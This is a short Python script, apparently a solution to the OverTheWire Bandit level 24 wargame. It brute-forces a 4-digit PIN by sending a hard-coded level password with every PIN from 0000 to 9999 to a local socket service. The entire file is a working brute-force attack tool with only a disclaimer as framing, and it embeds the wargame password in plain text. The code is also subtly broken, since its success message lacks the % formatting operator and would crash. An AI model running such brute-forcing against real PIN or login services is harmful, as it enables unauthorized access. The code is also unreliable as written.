#!/usr/bin/env python

'''
    unpin.py -- Simple 4-digit bruteforcer
    - overthewire.org
    - bandit24 bruteforcer script
    Disclaimer:
        I am not liable for using this script to bruteforce online pins.
        For CTF purposes / educational use only
'''

import itertools
import socket

# Set globals

passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
host = '127.0.0.1'
port = 30002


def generate_pin():

    # Generate 10000 combinations of 0000-9999 in a list
    # Updated for memory efficiency

    for i in itertools.product(range(10), repeat=4):

        pin = ''.join(map(str, i))

        yield pin


def send_data(host, port, passwd):

    # Number of tries to be sent to stdout

    tries = 0

    # Send pieces of data to server

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to server

    s.connect((host, port))

    # Generate item from yielded result of pin
    pins = generate_pin()

    # Send data iterate over the yielded result
    for index, pin in enumerate(pins):

        pin = str(pin)

        data_src = '%s %s\n' % (passwd, pin)

        # Initialize messages
        if index == tries:
            if tries == 0:
                print('>> Sending data to server on port %s\n' % port)

        # Provide an update to user for every number of tries
            if index == tries:
                print('> %s data sent on port %s' % (tries, port))
                tries += 500

        # Transport data to server socket on target port
        s.sendall(data_src.encode('utf-8'))

        data_out = s.recv(1024)

        is_correct = 'Correct!'.encode('utf-8')

        if is_correct in data_out:

            result = data_out.decode('utf-8')
            print('%s \n\n+ PIN found: %s\n+ Tries: %s' (result, pin, str(index)))
            break

        else:
            pass


if __name__ == '__main__':

    send_data(host, port, passwd)
